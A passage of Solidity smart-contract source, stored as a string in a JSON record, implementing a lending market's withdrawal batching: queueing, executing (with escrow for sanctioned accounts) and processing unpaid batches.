uint32 expiry\n  ) external view nonReentrantView returns (uint256) {\n    if (expiry > block.timestamp) {\n      revert WithdrawalBatchNotExpired();\n    }\n    (, uint32 expiredBatchExpiry, WithdrawalBatch memory expiredBatch) = _calculateCurrentState();\n    WithdrawalBatch memory batch;\n    if (expiry == expiredBatchExpiry) {\n      batch = expiredBatch;\n    } else {\n      batch = _withdrawalData.batches[expiry];\n    }\n    AccountWithdrawalStatus memory status = _withdrawalData.accountStatuses[expiry][accountAddress];\n    // Rounding errors will lead to some dust accumulating in the batch, but the cost of\n    // executing a withdrawal will be lower for users.\n    uint256 previousTotalWithdrawn = status.normalizedAmountWithdrawn;\n    uint256 newTotalWithdrawn = uint256(batch.normalizedAmountPaid).mulDiv(\n      status.scaledAmount,\n      batch.scaledTotalAmount\n    );\n    return newTotalWithdrawn - previousTotalWithdrawn;\n  }\n\n  /* -------------------------------------------------------------------------- */\n  /*                             Withdrawal Actions                             */\n  /* -------------------------------------------------------------------------- */\n\n  /**\n   * @dev Create a withdrawal request for a lender.\n   */\n  function queueWithdrawal(uint256 amount) external nonReentrant {\n    MarketState memory state = _getUpdatedState();\n\n    // Cache account data and revert if not authorized to withdraw.\n    Account memory account = _getAccountWithRole(msg.sender, AuthRole.WithdrawOnly);\n\n    uint104 scaledAmount = state.scaleAmount(amount).toUint104();\n    if (scaledAmount == 0) {\n      revert NullBurnAmount();\n    }\n\n    // Reduce caller's balance and emit transfer event.\n    account.scaledBalance -= scaledAmount;\n    _accounts[msg.sender] = account;\n    emit Transfer(msg.sender, address(this), amount);\n\n    // If there is no pending withdrawal batch, create a new one.\n    if (state.pendingWithdrawalExpiry == 0) {\n      state.pendingWithdrawalExpiry = uint32(block.timestamp + withdrawalBatchDuration);\n      emit WithdrawalBatchCreated(state.pendingWithdrawalExpiry);\n    }\n    // Cache batch expiry on the stack for gas savings.\n    uint32 expiry = state.pendingWithdrawalExpiry;\n\n    WithdrawalBatch memory batch = _withdrawalData.batches[expiry];\n\n    // Add scaled withdrawal amount to account withdrawal status, withdrawal batch and market state.\n    _withdrawalData.accountStatuses[expiry][msg.sender].scaledAmount += scaledAmount;\n    batch.scaledTotalAmount += scaledAmount;\n    state.scaledPendingWithdrawals += scaledAmount;\n\n    emit WithdrawalQueued(expiry, msg.sender, scaledAmount);\n\n    // Burn as much of the withdrawal batch as possible with available liquidity.\n    uint256 availableLiquidity = batch.availableLiquidityForPendingBatch(state, totalAssets());\n    if (availableLiquidity > 0) {\n      _applyWithdrawalBatchPayment(batch, state, expiry, availableLiquidity);\n    }\n\n    // Update stored batch data\n    _withdrawalData.batches[expiry] = batch;\n\n    // Update stored state\n    _writeState(state);\n  }\n\n  /**\n   * @dev Execute a pending withdrawal request for a batch that has expired.\n   *\n   *      Withdraws the proportional amount of the paid batch owed to\n   *      `accountAddress` which has not already been withdrawn.\n   *\n   *      If `accountAddress` is sanctioned, transfers the owed amount to\n   *      an escrow contract specific to the account and blocks the account.\n   *\n   *      Reverts if:\n   *      - `expiry > block.timestamp`\n   *      -  `expiry` does not correspond to an existing withdrawal batch\n   *      - `accountAddress` has already withdrawn the full amount owed\n   */\n  function executeWithdrawal(\n    address accountAddress,\n    uint32 expiry\n  ) external nonReentrant returns (uint256) {\n    if (expiry > block.timestamp) {\n      revert WithdrawalBatchNotExpired();\n    }\n    MarketState memory state = _getUpdatedState();\n\n    WithdrawalBatch memory batch = _withdrawalData.batches[expiry];\n    AccountWithdrawalStatus storage status = _withdrawalData.accountStatuses[expiry][\n      accountAddress\n    ];\n\n    uint128 newTotalWithdrawn = uint128(\n      MathUtils.mulDiv(batch.normalizedAmountPaid, status.scaledAmount, batch.scaledTotalAmount)\n    );\n\n    uint128 normalizedAmountWithdrawn = newTotalWithdrawn - status.normalizedAmountWithdrawn;\n\n    status.normalizedAmountWithdrawn = newTotalWithdrawn;\n    state.normalizedUnclaimedWithdrawals -= normalizedAmountWithdrawn;\n\n    if (normalizedAmountWithdrawn == 0) {\n      revert NullWithdrawalAmount();\n    }\n\n    if (IWildcatSanctionsSentinel(sentinel).isSanctioned(borrower, accountAddress)) {\n      _blockAccount(state, accountAddress);\n      address escrow = IWildcatSanctionsSentinel(sentinel).createEscrow(\n        accountAddress,\n        borrower,\n        address(asset)\n      );\n      asset.safeTransfer(escrow, normalizedAmountWithdrawn);\n      emit SanctionedAccountWithdrawalSentToEscrow(\n        accountAddress,\n        escrow,\n        expiry,\n        normalizedAmountWithdrawn\n      );\n    } else {\n      asset.safeTransfer(accountAddress, normalizedAmountWithdrawn);\n    }\n\n    emit WithdrawalExecuted(expiry, accountAddress, normalizedAmountWithdrawn);\n\n    // Update stored state\n    _writeState(state);\n\n    return normalizedAmountWithdrawn;\n  }\n\n  function processUnpaidWithdrawalBatch() external nonReentrant {\n    MarketState memory state = _getUpdatedState();\n\n    // Get the next unpaid batch timestamp from storage (reverts if none)\n    uint32 expiry = _withdrawalData.unpaidBatches.first();\n\n    // Cache batch data in memory\n    WithdrawalBatch memory batch = _withdrawalData.batches[expiry];\n\n    // Calculate assets available to process the batch\n    uint256 availableLiquidity = totalAssets() -\n      (state.normalizedUnclaimedWithdrawals + state.accruedProtocolFees);\n\n    _applyWithdrawalBatchPayment(batch, state, expiry, availableLiquidity);\n\n    // Remove batch from unpaid set if fully paid\n    if (batch.scaledTotalAmount == batch.scaledAmountBurned) {\n      _withdrawalData.unpaidBatches.shift();\n      emit WithdrawalBatchClosed(expiry);\n    }\n\n    // Update stored batch\n    _withdrawalData.batches[expiry] = batch;\n    _writeState(state);\n  }\n}"
    }
  ]
}